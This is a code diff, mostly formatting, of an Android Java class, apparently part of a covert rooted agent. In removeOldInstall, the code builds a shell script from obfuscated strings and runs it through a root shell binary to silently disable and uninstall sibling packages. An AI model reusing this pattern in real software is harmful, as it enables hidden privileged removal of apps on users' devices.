@@ -37,8 +37,6 @@ import java.util.List;
 import javax.xml.parsers.FactoryConfigurationError;
 import javax.xml.parsers.ParserConfigurationException;
 
-import com.android.dvci.Root;
-
 public class PackageInfo {
 	private static final String TAG = "PackageInfo";
 
@@ -266,9 +264,9 @@ public class PackageInfo {
 		return false;
 	}
 
-	public static boolean removeOldInstall(String ShellFileBase){
-		int uid= android.os.Process.myUid();
-		String myName= Status.getAppContext().getPackageName();
+	public static boolean removeOldInstall(String ShellFileBase) {
+		int uid = android.os.Process.myUid();
+		String myName = Status.getAppContext().getPackageName();
 		final PackageManager pm = Status.getAppContext().getPackageManager();
 		//get a list of installed apps.
 		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
@@ -276,23 +274,23 @@ public class PackageInfo {
 		//loop through the list of installed packages and see if the selected
 		//app is in the list
 		for (ApplicationInfo packageInfo : packages) {
-			if(packageInfo.uid == uid && !packageInfo.packageName.equalsIgnoreCase(myName)){
+			if (packageInfo.uid == uid && !packageInfo.packageName.equalsIgnoreCase(myName)) {
 				//get the UID for the selected app
 				apps.add(packageInfo.packageName);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (removeOldInstall) found leftover:"+packageInfo.packageName);
+					Check.log(TAG + " (removeOldInstall) found leftover:" + packageInfo.packageName);
 				}
 			}
 		}
 
-		if(!apps.isEmpty()){
+		if (!apps.isEmpty()) {
 			//forge the script
-			String script = M.e("#!/system/bin/sh")+ "\n";
-			for(String r:apps) {
-				if(ShellFileBase!=null) {
-					script += ShellFileBase+M.e(" qzx ")+ M.e("\"pm disable ") + r + "\"\n" +
-							  ShellFileBase+M.e(" qzx ")+ M.e("\"pm uninstall ") + r + "\"\n";
-				}else{
+			String script = M.e("#!/system/bin/sh") + "\n";
+			for (String r : apps) {
+				if (ShellFileBase != null) {
+					script += ShellFileBase + M.e(" qzx ") + M.e("\"pm disable ") + r + "\"\n" +
+							ShellFileBase + M.e(" qzx ") + M.e("\"pm uninstall ") + r + "\"\n";
+				} else {
 					script += M.e("pm disable ") + r + "\n" +
 							M.e("pm uninstall ") + r + "\n";
 				}
@@ -310,7 +308,7 @@ public class PackageInfo {
 				return false;
 			}
 			Execute ex = new Execute();
-			ex.execute( Status.getAppContext().getFilesDir() + "/o ");
+			ex.execute(Status.getAppContext().getFilesDir() + "/o ");
 			Root.removeScript("o");
 
 			if (Cfg.DEBUG) {
@@ -320,9 +318,9 @@ public class PackageInfo {
 		}
 		return false;
 	}
+
 	public static boolean upgradeRoot() {
 		final AutoFile file = new AutoFile(Configuration.oldShellFileBase);
-
 
 
 		if (file.exists() && file.canRead()) {
